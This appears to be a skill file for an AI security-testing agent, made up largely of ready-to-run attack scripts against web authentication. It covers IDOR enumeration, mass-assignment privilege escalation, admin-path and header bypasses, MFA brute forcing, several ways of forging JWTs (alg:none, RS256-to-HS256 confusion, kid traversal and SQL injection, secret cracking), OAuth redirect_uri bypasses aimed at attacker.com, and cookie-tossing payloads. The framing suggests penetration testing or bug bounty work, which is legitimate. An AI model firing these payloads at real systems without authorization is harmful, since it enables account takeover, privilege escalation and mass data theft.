---
name: auth-hunt
description: IDOR, access control, auth/session, JWT, OAuth, API versioning. After DISCOVERY finds candidates — active testing, payload firing, CVE verification. Use when testing AUTH vulnerabilities.
---

# SKILL-AUTH-HUNT — Authentication & Authorization Hunting — HUNT
# Phase Coverage: 11-15, 34
# Vuln Classes: IDOR, Access Control, Auth/Session, JWT, OAuth, API Versioning,
#               Privilege Escalation, Environment Variable Bypass
# Purpose: Hunting payloads and commands for identity, authorization, and session management vulnerabilities

---

## Phase 11: IDOR / Broken Object Level Authorization — CIA: C:H I:H

### SUB-PHASE 11.2: HUNT

**Sequential enumeration:**
```bash
#!/bin/bash
TARGET=$1; TOKEN1=$2; TOKEN2=$3; ENDPOINT=$4
echo "[*] IDOR sweep: $TARGET$ENDPOINT"
for id in $(seq 1 200); do
  RESP=$(curl -sk "$TARGET$ENDPOINT/$id" \
         -H "Authorization: Bearer $TOKEN2" -w "\nHTTP:%{http_code}")
  echo "$RESP" | grep -vE "HTTP:40[0-9]" | grep "HTTP:" \
    && echo "[IDOR] ID=$id accessible by user2"
done
# Cross-account: user1 owns object, user2 reads it
MY_OBJ=$(curl -sk -X POST "$TARGET$ENDPOINT" \
          -H "Authorization: Bearer $TOKEN1" \
          -H "Content-Type: application/json" \
          -d '{"name":"test"}' | jq -r '.id')
RESP=$(curl -sk "$TARGET$ENDPOINT/$MY_OBJ" \
       -H "Authorization: Bearer $TOKEN2" -w " HTTP:%{http_code}")
[[ "$RESP" == *"200"* ]] && echo "[IDOR CONFIRMED — CIA:C:H] user2 reads user1 object"
```

**Base64 ID bypass:**
```bash
python3 -c "
import base64
for i in [1,2,3,100]:
    enc = base64.b64encode(f'user_{i}'.encode()).decode()
    print(f'ID {i}: {enc}')
"
```

**HTTP method matrix:**
```bash
for m in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  printf "$m: "
  curl -sk -X "$m" "$TARGET/api/endpoint" \
       -H "Authorization: Bearer $USER1_TOKEN" -w "%{http_code}\n" -o /dev/null
done
```

**Mass assignment with privilege escalation:**
```bash
curl -sk -X PUT "$TARGET/api/Users/me" \
     -H "Authorization: Bearer $USER1_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"role":"admin","isAdmin":true,"privilege":99,"credit":999999}' | jq .
```

**Dual User ID Scheme Attack:**
```
SOURCE: wiki/raw-refs/tanvir-idor-dual-user-id.md
PATTERN: When an application uses TWO different ID formats for the same object
         (e.g., a 32-char non-guessable hash AND a sequential numeric ID),
         BOTH reference paths must be tested for authorization. One being
         non-guessable doesn't protect the other.
```

```bash
# Discovery: Find all ID formats for the same object
# Step 1: Get your own user object via the primary API
USER1_DATA=$(curl -sk "$TARGET/api/user/me" \
  -H "Authorization: Bearer $USER1_TOKEN")
echo "$USER1_DATA" | jq '{id, user_id, uuid, account_id, internal_id}'

# Step 2: Look for alternate ID formats in:
# - Account creation responses (sequential IDs often shown)
# - URL parameters in redirects
# - Email verification links
# - API response fields beyond the primary 'id'
# - WebSocket messages
# - GraphQL node IDs

# Step 3: Test each discovered ID format with user2's token
# Hash-based path: /api/users/a1b2c3d4e5f6... (32 chars, non-guessable)
# Numeric path:    /api/users/18356 (sequential, guessable)

# Test numeric ID path with user2 token
USER1_NUMERIC_ID=18356  # Found in account creation response
curl -sk "$TARGET/api/users/$USER1_NUMERIC_ID" \
  -H "Authorization: Bearer $USER2_TOKEN" -w " HTTP:%{http_code}"
# If 200 with user1's data → IDOR via numeric ID path

# Step 4: Prove sequential assignment
# Create a new account (user3), check its numeric ID
# If user1=18356, user2=18357, user3=18358 → sequential confirmed
```

**Batch Endpoint / No-ID Enumeration:**
```
SOURCE: wiki/raw-refs/tanvir-idor-dual-user-id.md — Technique 2
PATTERN: Single-object IDOR escalates to mass data access when the endpoint
         is called WITHOUT any ID parameter, returning ALL user records.
         
DISCOVERY: Remove the ID from endpoint paths and observe behavior:
  /api/users/18356 → returns one user (single IDOR)
  /api/users       → returns ALL users (batch endpoint)
  /api/UserId      → returns ALL users (no ID variant)
```

```bash
# Hunt: Test endpoints without IDs
ENDPOINTS=(
  "/api/users" "/api/UserId" "/api/Users" "/api/accounts"
  "/api/v1/user" "/api/v1/users/all" "/api/admin/users"
  "/api/internal/users" "/api/UserList" "/api/GetAllUsers"
)

for ep in "${ENDPOINTS[@]}"; do
  S=$(curl -sk -w "%{http_code}" -o /tmp/batch_test.txt \
       "$TARGET$ep" -H "Authorization: Bearer $USER2_TOKEN")
  if [[ "$S" == "200" ]]; then
    COUNT=$(cat /tmp/batch_test.txt | jq 'length' 2>/dev/null || \
            grep -oP '"email"' /tmp/batch_test.txt | wc -l)
    [[ $COUNT -gt 1 ]] && echo "[BATCH ENDPOINT — CIA:C:H] $ep → $COUNT records returned"
  fi
done

# Hunt: Remove object ID from single-object endpoint
# Original: /api/users/18356 → single user
# Test:     /api/users/      → all users?
# Test:     /api/users/0     → first user?
# Test:     /api/users/-1    → error with all users?
# Test:     /api/users/*     → wildcard?

for suffix in "" "/" "/0" "/-1" "/*" "/all" "/list"; do
  S=$(curl -sk -w "%{http_code}" -o /tmp/batch2.txt \
       "$TARGET/api/users$suffix" -H "Authorization: Bearer $USER2_TOKEN")
  [[ "$S" == "200" ]] && echo "[BATCH CANDIDATE] /api/users$suffix → HTTP $S"
done
```

**Weak Signal Escalation Protocol:**
```
SOURCE: wiki/raw-refs/tanvir-idor-dual-user-id.md — Technique 4
PATTERN: Weak signals (missing CSRF, missing rate limit, verbose errors)
         are indicators of weak server-side validation. When you find a weak
         signal, don't stop — use it as motivation to dig deeper.
         The researcher found missing CSRF → dug deeper → found critical IDOR.

WEAK SIGNAL → DEEPER TEST MAP:
  Missing CSRF token       → Test IDOR (weak server-side validation)
  Missing rate limit       → Test brute-force, IDOR enumeration, race conditions
  Verbose error messages   → Test SQLi, injection, info disclosure
  No auth on OPTIONS       → Test CORS, access-control bypass
  ID in URL (not POST)     → Test IDOR, parameter pollution
  Sequential IDs visible   → Test batch endpoint, mass enumeration
  Client-side validation   → Test API directly (bypass frontend limits)
```

### CHAIN OUTPUT:
  → IDOR read (medium) + CORS = cross-origin data exfil (high)
  → IDOR write (high) + mass-assignment = privilege escalation (critical)
  → IDOR on password reset token → ATO (critical)
  → IDOR + 2FA bypass = mass ATO (critical)
  → Dual user ID + numeric path = non-guessable bypass (critical)
  → Batch endpoint + sequential IDs = mass data exfiltration (critical)
  → Weak signal (CSRF missing) + deeper dig = critical IDOR discovery

---

## Phase 12: Broken Access Control — CIA: C:H I:H

### SUB-PHASE 12.2: HUNT

**Admin path enumeration:**
```bash
ADMIN_PATHS=("/admin" "/admin/users" "/administrator" "/manager" "/console"
             "/api/admin" "/api/internal" "/api/private" "/actuator/env"
             "/actuator/heapdump" "/.env" "/.git/config")
for path in "${ADMIN_PATHS[@]}"; do
  S=$(curl -sk -w "%{http_code}" -o /tmp/access_test.txt \
       "$TARGET$path" -H "Authorization: Bearer $USER1_TOKEN")
  [[ "$S" == "200" ]] && echo "[ACCESS CONTROL — CIA:C:H] $path → HTTP $S" \
    && head -3 /tmp/access_test.txt
done
```

**Header-based override:**
```bash
for header in "X-Original-URL: /admin/users" "X-Rewrite-URL: /admin/users" \
              "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1"; do
  S=$(curl -sk -w "%{http_code}" -o /dev/null "$TARGET/" \
       -H "Authorization: Bearer $USER1_TOKEN" -H "$header")
  [[ "$S" == "200" ]] && echo "[ACCESS CONTROL bypass via header] $header"
done
```

**Path normalization bypass:**
```bash
for path in "/ADMIN" "/%2fadmin" "//admin//" "/admin/../admin/" "/admin;/"; do
  S=$(curl -sk -w "%{http_code}" -o /dev/null "$TARGET$path")
  [[ "$S" == "200" ]] && echo "[ACCESS CONTROL path bypass] $path"
done
```

**HTTP method override:**
```bash
curl -sk -X POST "$TARGET/api/user/delete" \
     -H "X-HTTP-Method-Override: DELETE" \
     -H "Authorization: Bearer $USER1_TOKEN" -w " HTTP:%{http_code}"
```

### CHAIN OUTPUT:
  → Access-control bypass (high) + admin panel = full data access (critical)
  → Path bypass + JWT weak = admin without valid credentials (critical)

---

## Phase 13: Authentication & Session Management — CIA: C:H I:H

### SUB-PHASE 13.2: HUNT

**Session cookie flag audit:**
```bash
# Check all Set-Cookie headers for secure flags
curl -sk -I "$TARGET" | grep -i 'set-cookie' | while read line; do
  echo "=== Cookie: $line"
  echo "$line" | grep -qi 'HttpOnly' || echo "  [MISSING HttpOnly — XSS can steal]"
  echo "$line" | grep -qi 'Secure' || echo "  [MISSING Secure — sent over HTTP]"
  echo "$line" | grep -qi 'SameSite' || echo "  [MISSING SameSite — CSRF risk]"
  echo "$line" | grep -qi 'SameSite=None' && echo "  [SameSite=None — requires Secure]"
  echo "$line" | grep -qi 'domain=' && echo "  [Domain cookie — shared with subdomains]"
done

# Also check via curl for cookie flags on auth endpoints
for ep in "/api/login" "/api/register" "/api/auth" "/signin" "/signup"; do
  curl -sk -I "$TARGET$ep" | grep -i 'set-cookie'
done
```

**Token in localStorage detection:**
```javascript
// Run via mcp__firefox-devtools__evaluate_script
() => {
  const findings = [];
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const val = localStorage.getItem(key);
    // Check for JWT, API keys, tokens
    if (val.match(/^eyJ/) || val.match(/[a-zA-Z0-9+/]{40,}={0,2}$/)) {
      findings.push({ key, type: 'potential-token', preview: val.substring(0, 50) });
    }
    try {
      const parsed = JSON.parse(val);
      if (parsed.token || parsed.apiKey || parsed.secret || parsed.privateKey || parsed.accessToken) {
        findings.push({ key, type: 'json-secret', hasFields: Object.keys(parsed) });
      }
    } catch(e) {}
  }
  return findings;
}
```

**Username enumeration:**
```bash
for email in "admin@target.com" "user@target.com" "xyz_fake_99@nothing.io"; do
  T=$(curl -sk -o /tmp/login_resp.txt -w "%{time_total}" -X POST "$TARGET/api/login" \
       -H "Content-Type: application/json" \
       -d "{\"email\":\"$email\",\"password\":\"wrong\"}")
  MSG=$(grep -oiE "invalid password|user not found|no account|incorrect" /tmp/login_resp.txt | head -1)
  echo "$email: ${T}s | $MSG"
done
```

**Email enumeration via response discrepancy:**
```bash
#!/bin/bash
# PHASE 13A — Email Enumeration via Response Discrepancy
# CIA: C:I — Attacker can determine which emails have accounts
TARGET=$1
KNOWN_VALID="admin@target.com"
KNOWN_INVALID="fake_999@nothing.io"

echo "[*] Testing email enumeration: $TARGET"

# Test known valid email
VALID_RESP=$(curl -sk "$TARGET/api/public/user-auth/address-info?address=$KNOWN_VALID" \
  -H "client-type: WEB")
VALID_FIELD=$(echo "$VALID_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['data'].get('useSimplePwd','N/A'))" 2>/dev/null)

# Test known invalid email
INVALID_RESP=$(curl -sk "$TARGET/api/public/user-auth/address-info?address=$KNOWN_INVALID" \
  -H "client-type: WEB")
INVALID_FIELD=$(echo "$INVALID_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['data'].get('useSimplePwd','N/A'))" 2>/dev/null)

echo "[*] Valid email useSimplePwd: $VALID_FIELD"
echo "[*] Invalid email useSimplePwd: $INVALID_FIELD"

if [ "$VALID_FIELD" != "$INVALID_FIELD" ]; then
  echo "[EMAIL ENUM — CIA:C:I] Response differs between valid and invalid emails"
fi

# Bulk enumeration
for email in "admin@$TARGET" "test@$TARGET" "user@$TARGET" "info@$TARGET"; do
  RESP=$(curl -sk "$TARGET/api/public/user-auth/address-info?address=$email" \
    -H "client-type: WEB")
  STATUS=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['data'].get('useSimplePwd','N/A'))" 2>/dev/null)
  echo "  $email: useSimplePwd=$STATUS"
done
```

**Email enumeration via timing discrepancy:**
```bash
#!/bin/bash
# Timing-based email enumeration (when response body is identical)
TARGET=$1
for email in "admin@target.com" "fake_999@nothing.io"; do
  T=$(curl -sk -o /dev/null -w "%{time_total}" \
    "$TARGET/api/public/user-auth/address-info?address=$email" \
    -H "client-type: WEB")
  echo "$email: ${T}s"
done
# If valid emails take longer → timing enumeration confirmed
```

**Public MFA endpoint brute force:**
```bash
#!/bin/bash
# PHASE 13B — Public MFA Endpoint Testing
# CIA: C:H — Attacker can brute force MFA codes without authentication
TARGET=$1

echo "[*] Testing public MFA endpoint: $TARGET"

# Test 1: Public access (no auth required)
RESP=$(curl -sk -X POST "$TARGET/api/public/security/verify-mfa" \
  -H "client-type: WEB" \
  -H "Content-Type: application/json" \
  -d '{"authType":"ga","code":"123456"}')
echo "[*] No auth response: $RESP" | head -1

# Test 2: authType=0 crash test
RESP=$(curl -sk -X POST "$TARGET/api/public/security/verify-mfa" \
  -H "client-type: WEB" \
  -H "Content-Type: application/json" \
  -d '{"authType":0,"code":"123456"}' -w "\nHTTP:%{http_code}")
echo "[*] authType=0 response: $RESP"

# Test 3: Rate limiting test
echo "[*] Testing rate limiting (20 rapid requests)..."
for i in $(seq 1 20); do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -X POST \
    "$TARGET/api/public/security/verify-mfa" \
    -H "client-type: WEB" \
    -H "Content-Type: application/json" \
    -d "{\"authType\":\"ga\",\"code\":\"$i\"}")
  echo -n "$CODE "
done
echo ""

# Test 4: authType matrix
for type in 0 1 2 3 4 5 6 7 8 9 -1 -2 10 99 "ga" "sms" "email"; do
  RESP=$(curl -sk -X POST "$TARGET/api/public/security/verify-mfa" \
    -H "client-type: WEB" \
    -H "Content-Type: application/json" \
    -d "{\"authType\":$type,\"code\":\"123456\"}")
  STATUS=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('status','N/A'))" 2>/dev/null)
  echo "  authType=$type: status=$STATUS"
done
```

**Predictable session tokens:**
```bash
python3 - << 'EOF'
import requests, hashlib, time, os
TARGET = os.environ.get('TARGET', 'http://localhost:3000')
for i in range(int(time.time())-5, int(time.time())+1):
    tok = hashlib.md5(str(i).encode()).hexdigest()
    r = requests.get(f"{TARGET}/api/profile", cookies={"session": tok}, timeout=3)
    if r.status_code == 200 and "error" not in r.text.lower():
        print(f"[PREDICTABLE SESSION — CIA:C:H] token: {tok}")
EOF
```

**Session fixation:**
```bash
curl -sk -c /tmp/pre_login.txt -b /tmp/pre_login.txt "$TARGET/login" -D - \
  | grep -i "set-cookie" > /tmp/pre_session.txt
curl -sk -c /tmp/post_login.txt -b /tmp/pre_login.txt \
     -X POST "$TARGET/api/login" \
     -H "Content-Type: application/json" \
     -d '{"email":"user@t.com","password":"Pass1!"}' -D - \
     | grep -i "set-cookie" > /tmp/post_session.txt
diff /tmp/pre_session.txt /tmp/post_session.txt || echo "[SESSION FIXATION — CIA:C:H]"
```

**Reset token in response:**
```bash
TOKEN=$(curl -sk -X POST "$TARGET/forgot-password" \
        -H "Content-Type: application/json" \
        -d '{"email":"known@target.com"}' | jq -r '.token // .resetToken // empty')
[[ -n "$TOKEN" ]] && echo "[CIA:C:H] RESET TOKEN LEAKED IN RESPONSE: $TOKEN"
```

### CHAIN OUTPUT:
  → Session fixation (high) + CSRF = force victim to attacker's session (critical)
  → Password reset token in response (high) = direct ATO (critical)
  → Username enumeration (low) + timing attack = targeted brute force (high)

---

## Phase 14: JWT Vulnerabilities — CIA: C:H I:H

### SUB-PHASE 14.2: HUNT

**Decode:**
```bash
python3 - << 'EOF'
import base64, json, os
tok = os.environ.get('USER1_TOKEN', '')
for i, part in enumerate(tok.split('.')[:2]):
    padded = part + '=' * (4 - len(part) % 4)
    try: print(f"Part {i}:", json.dumps(json.loads(base64.urlsafe_b64decode(padded)), indent=2))
    except: print(f"Part {i}: [not JSON]")
EOF
```

**alg:none attack (2026 — still persists in JWE):**
```bash
python3 - << 'EOF'
import base64, json
def b64e(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).decode().rstrip('=')
for alg in ["none","None","NONE","nOnE"]:
    h = b64e({"alg":alg,"typ":"JWT"})
    p = b64e({"sub":"1","data":{"id":1,"email":"admin@target.com","role":"admin"},"iat":9999999999})
    print(f"[{alg}] {h}.{p}.")
EOF
```

**RS256 → HS256 algorithm confusion (full exploit):**
```bash
# Step 1: Fetch the public key from JWKS endpoint
curl -sk "$TARGET/.well-known/jwks.json" | jq . > /tmp/jwks.json

# Step 2: Extract RSA public key
python3 - << 'EOF'
import json, base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

with open('/tmp/jwks.json') as f:
    jwks = json.load(f)

for key in jwks.get('keys', []):
    # Reconstruct RSA public key from JWK
    n = int.from_bytes(base64.urlsafe_b64decode(key['n'] + '=='), 'big')
    e = int.from_bytes(base64.urlsafe_b64decode(key['e'] + '=='), 'big')
    pub_key = rsa.RSAPublicNumbers(e, n).public_key()
    pem = pub_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    with open('/tmp/public.pem', 'wb') as f:
        f.write(pem)
    print(f"Public key saved. Key ID: {key.get('kid', 'none')}")
EOF

# Step 3: Forge token using public key as HMAC secret (HS256)
python3 - << 'EOF'
import jwt, json

with open('/tmp/public.pem', 'r') as f:
    public_key = f.read()

# Forge with role=admin
forged_token = jwt.encode(
    {"sub": "admin", "role": "superuser", "iat": 1700000000},
    public_key,
    algorithm="HS256"
)
print(f"Forged token: {forged_token}")
# Send with: Authorization: Bearer <forged_token>
EOF
```

**Weak secret brute-force (comprehensive):**
```bash
# Extract JWT hash
echo "$USER1_TOKEN" > /tmp/jwt.txt

# Method 1: hashcat (fastest)
hashcat -a 0 -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt --quiet

# Method 2: john the ripper
jwt2john.py "$USER1_TOKEN" > /tmp/jwt_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/jwt_hash.txt

# Method 3: jwt_tool (integrated cracking)
python3 jwt_tool.py "$USER1_TOKEN" -C -d /usr/share/wordlists/rockyou.txt

# Method 4: Common secrets to try manually
COMMON_SECRETS=("secret" "password" "jwt_secret" "supersecret" "changeme"
  "your-256-bit-secret" "shhhhh" "keyboard cat" "your-256-bit-secret-here")
for secret in "${COMMON_SECRETS[@]}"; do
  python3 jwt_tool.py "$USER1_TOKEN" -X k -S "$secret" 2>/dev/null | grep -q "valid" && \
    echo "[WEAK SECRET FOUND] $secret"
done
```

**Payload manipulation (if secret is known):**
```bash
# jwt_tool — inject admin role
python3 jwt_tool.py "$USER1_TOKEN" -I -pc role -pv admin

# jwt_tool — change subject
python3 jwt_tool.py "$USER1_TOKEN" -I -ps sub -pv admin@target.com

# jwt_tool — extend expiration
python3 jwt_tool.py "$USER1_TOKEN" -I -pc exp -pv 9999999999
```

**kid SQL/path traversal:**
```bash
# {"alg":"HS256","kid":"../../dev/null"} → sign with empty key
# {"alg":"HS256","kid":"x' UNION SELECT 'attacker_secret'--"}

python3 - << 'EOF'
import base64, json, hmac

def b64e(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).decode().rstrip('=')

# Forge token with malicious kid
header = b64e({"alg":"HS256","kid":"../../dev/null"})
payload = b64e({"sub":"admin","role":"admin","iat":1700000000})
# Sign with empty string (../../dev/null resolves to empty)
sig = hmac.new(b"", f"{header}.{payload}".encode(), "sha256").digest()
token = f"{header}.{payload}.{base64.urlsafe_b64encode(sig).decode().rstrip('=')}"
print(f"Forged token (empty kid): {token}")
EOF
```

**Token rotation check (session fixation via JWT):**
```bash
# Get token before password change
OLD_TOKEN="$USER1_TOKEN"

# Change password
curl -sk -X POST "$TARGET/api/change-password" \
  -H "Authorization: Bearer $OLD_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"old":"current","new":"NewP4ss!2026"}'

# Test if old token still works (token not rotated = session fixation)
S=$(curl -sk -w "%{http_code}" -o /dev/null "$TARGET/api/user/me" \
  -H "Authorization: Bearer $OLD_TOKEN")
[[ "$S" == "200" ]] && echo "[JWT SESSION FIXATION — CIA:C:H] Old token still valid after password change"
```

### CHAIN OUTPUT:
  → JWT alg:none (critical standalone) → admin API access → DB dump (critical)
  → JWT weak secret → forge admin role → mass ATO (critical)
  → JWT kid SQLi → inject custom signing key → forge any token (critical)
  → JWT RS256→HS256 confusion → forge token with public key → admin (critical)
  → JWT no rotation → session fixation after password change → ATO (high)
  → JWT in localStorage + XSS → token theft → ATO (critical)

---

## Phase 15: OAuth2 / OpenID Connect Flaws — CIA: C:H I:H

### SUB-PHASE 15.2: HUNT

**redirect_uri bypass:**
```bash
for redir in \
  "https://attacker.com/callback" \
  "https://legit.com.attacker.com/" \
  "https://legit.com@attacker.com/" \
  "https://legit.com/../../attacker.com/" \
  "https://legit.com?url=https://attacker.com" \
  "https://legit.com/redirect?url=https://attacker.com"; do
  URL="$TARGET/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$redir''',safe=''))")&scope=openid"
  LOC=$(curl -sk -o /dev/null -w "%{redirect_url}" "$URL")
  [[ "$LOC" == *"attacker"* ]] && echo "[OAUTH REDIRECT — CIA:C:H] $redir → $LOC"
done
```

**Missing state parameter (CSRF):**
```bash
# Check if /authorize request includes &state= parameter
# If missing → CSRF on OAuth flow → force victim to link attacker's account
```

**Token leakage via Referer (implicit flow):**
```bash
mcp_burp_get_proxy_http_history_regex(regex="access_token|id_token|token=")
```

### CHAIN OUTPUT:
  → OAuth redirect_uri bypass (critical) → token theft → ATO (critical)
  → Missing state (medium) + open-redirect = CSRF token theft (high)
  → OAuth token in URL + Referer leak = token exfil (high)

---

## Phase 34: API Security Flaws — CIA: C:H I:H

### SUB-PHASE 34.2: HUNT

**Version traversal:**
```bash
for v in v1 v2 v3 v0 v4 beta dev old legacy; do
  for ep in "/api/$v/users" "/api/$v/admin" "/$v/api/users" "/api/$v/profile"; do
    S=$(curl -sk -w "%{http_code}" -o /tmp/ver_test.txt "$TARGET$ep" \
         -H "Authorization: Bearer $USER1_TOKEN")
    [[ "$S" == "200" ]] && echo "[API VERSION — CIA:C:H] $ep → HTTP $S" && head -3 /tmp/ver_test.txt
  done
done
```

**Swagger/OpenAPI exposure:**
```bash
for p in "/swagger.json" "/swagger/v1/swagger.json" "/openapi.json" "/api-docs" \
         "/v2/api-docs" "/v3/api-docs" "/swagger-ui.html"; do
  S=$(curl -sk -w "%{http_code}" -o /tmp/swagger.json "$TARGET$p")
  [[ "$S" == "200" ]] && jq '.paths | keys[]' /tmp/swagger.json 2>/dev/null \
    | tee -a ~/agents/finetune/fullrecon/${SLUG}/discovered_endpoints.txt
    && echo "[OPENAPI FOUND — CIA:C:M] $p"
done
```

**Excessive data exposure:**
```bash
curl -sk "$TARGET/api/user/me" -H "Authorization: Bearer $USER1_TOKEN" | jq 'keys[]'
# Flag: password_hash, ssn, dob, internal_notes, api_key in response = C:H
```

### CHAIN OUTPUT:
  → Old API version (medium) + removed auth = unauthenticated data access (critical)
  → Swagger exposure (low) + hidden admin endpoints = privileged access (high)
  → Excessive data exposure (medium) + IDOR = mass PII dump (critical)

---

## Cookie Attack Hunting (Cross-Phase)

```
SOURCE: poorman3exp 2026 — Cookie Attack Field Guide (8 vectors)
CIA: I:H-C:H — Session hijacking, fixation, HttpOnly bypass
```

### Cookie Prefix Bypass
```javascript
// Unicode whitespace bypass (Django/ASP.NET)
document.cookie = `${String.fromCodePoint(0x2000)}__Host-session=evil; Domain=.target.com; Path=/;`;
// Django .strip() removes U+2000 → overwrites legitimate __Host-session cookie
```

### Cookie Tossing → Session Fixation
```javascript
// From subdomain XSS
document.cookie = "PHPSESSID=ATTACKER_KNOWN_ID; Domain=.target.com; Path=/; Secure";
// Victim visits → attacker's session → logs in → server binds victim to attacker's session
```

### Legacy Parsing Bypass (Tomcat/Jetty)
```javascript
document.cookie = `$Version=1,__Host-session=evil; Path=/somethingreallylong/; Domain=.target.com;`;
// Java switches to RFC 2965 legacy mode → parses as multiple cookies → bypasses prefix
```

### Guest Token BOLA (Wayback Machine Pattern)
```bash
# Get guest token (no login required)
curl -X POST https://api.target.com/v1/guest/session \
  -H "Content-Type: application/json" -d '{"device_id":"abc123"}'

# Use guest token on privileged endpoints
curl -H "Authorization: Bearer GUEST_TOKEN" https://api.target.com/v1/users/profile/1
curl -H "Authorization: Bearer GUEST_TOKEN" https://api.target.com/v1/admin/config
```

### Cookie Validation Checklist
```
□ Check session cookie attributes (HttpOnly, Secure, SameSite, Domain, Path)
□ Test __Host-/__Secure- prefix with Unicode whitespace (U+2000, U+00A0)
□ Test $Version=1 legacy parsing on Java backends
□ Check if any subdomain has XSS (cookie tossing prerequisite)
□ Check if cookies are scoped to parent domain (broad scoping = vulnerable)
□ Test method override for SameSite bypass (_method, X-HTTP-Method-Override)
```

---

*SKILL-AUTH-HUNT — Part of the acy Agentic Security Research System v3.0*
